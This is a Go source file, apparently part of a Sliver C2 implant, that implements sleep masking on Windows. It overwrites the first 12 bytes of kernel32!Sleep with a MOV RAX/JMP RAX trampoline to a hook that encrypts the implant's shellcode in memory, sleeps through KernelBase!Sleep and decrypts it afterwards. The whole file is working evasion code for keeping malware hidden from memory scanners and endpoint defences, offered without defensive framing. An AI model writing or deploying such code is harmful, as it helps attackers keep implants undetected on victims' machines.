//go:build windows && amd64

// installSleepHook patches the first 12 bytes of kernel32!Sleep with an
// absolute JMP to our Go hook function.
//
// Hook lifecycle:
//  1. Load kernel32.dll, find Sleep address
//  2. syscall.NewCallback wraps our Go maskSleep as a Windows-ABI function pointer
//  3. MOV RAX, hookAddr; JMP RAX (12 bytes) overwrites Sleep+0
//  4. The real Sleep is called via KernelBase!Sleep, bypassing our hook in
//     kernel32 (kernel32.Sleep is a thin forwarder on modern Windows)
//
// Why KernelBase bypass works:
//   On Windows 8+, kernel32.dll forwards most calls to KernelBase.dll. Our
//   12-byte patch only affects kernel32!Sleep. KernelBase!Sleep is untouched,
//   so calling it directly avoids re-entering our hook.
//
// Limitation (see package doc): Sliver's main callback sleep uses Go timers
// (time.Sleep → NtWaitForSingleObject), not Win32 Sleep. This hook catches
// kernel32!Sleep(0) yield calls and any Win32 Sleep from C helper code but
// does NOT intercept the primary beacon sleep interval. The timer backup in
// timer.go covers that case.
package main

import (
	"encoding/binary"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernelBase   = windows.NewLazySystemDLL("KernelBase.dll")
	procKBSleep     = modKernelBase.NewProc("Sleep")
)

// installSleepHook writes a 12-byte absolute JMP into kernel32!Sleep.
func installSleepHook() error {
	k32, err := windows.LoadDLL("kernel32.dll")
	if err != nil {
		return err
	}
	sleepProc, err := k32.FindProc("Sleep")
	if err != nil {
		return err
	}
	sleepAddr := sleepProc.Addr()

	// Build Windows-ABI function pointer from Go closure.
	// syscall.NewCallback bridges Windows x64 calling convention → Go ABI.
	hookFn := syscall.NewCallback(func(ms uint32) uintptr {
		maskSleep(ms)
		return 0 // Sleep returns void; RAX is ignored by caller
	})

	// 12-byte absolute JMP: MOV RAX, <hookFn>; JMP RAX
	var jmp [12]byte
	jmp[0], jmp[1] = 0x48, 0xB8 // REX.W MOV RAX, imm64
	binary.LittleEndian.PutUint64(jmp[2:10], uint64(hookFn))
	jmp[10], jmp[11] = 0xFF, 0xE0 // JMP RAX

	// Make Sleep+0..11 writable (copy-on-write; change only affects this process).
	var old uint32
	if err := windows.VirtualProtect(unsafe.Pointer(sleepAddr), 12,
		windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return err
	}
	copy((*[12]byte)(unsafe.Pointer(sleepAddr))[:], jmp[:])
	windows.VirtualProtect(unsafe.Pointer(sleepAddr), 12, old, &old) //nolint:errcheck
	return nil
}

// maskSleep is the body of the Sleep hook.
//
// Sequence: encrypt shellcode → call real Sleep (KernelBase, not kernel32) → decrypt.
// No-op if already masked (re-entrant protection in encryptMemory/decryptMemory).
func maskSleep(ms uint32) {
	encryptMemory()
	procKBSleep.Call(uintptr(ms))
	decryptMemory()
}
